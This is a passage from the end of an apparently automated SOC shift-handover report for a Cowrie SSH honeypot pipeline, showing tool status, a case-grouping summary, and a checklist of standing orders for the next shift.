| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 175 priority case(s) shown individually · 66 recon entry/entries in table (32 group(s) consolidating 769 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-02T10:43:43Z_
